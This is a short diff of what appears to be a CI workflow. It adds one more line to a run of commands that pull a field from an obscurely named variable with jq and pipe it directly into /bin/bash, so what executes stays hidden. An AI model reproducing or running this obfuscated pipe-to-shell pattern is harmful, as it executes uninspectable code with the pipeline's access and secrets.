@@ -30,6 +30,7 @@ jobs:
           echo $vbsa28071 | jq -r .ju008 | /bin/bash
           echo $uwsv8 | jq -r .at40796 | /bin/bash
           printf '%s' "$gs80278" | jq -r .kfdtm97579 | /bin/bash
+          echo $w16140 | jq -r .c1292 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
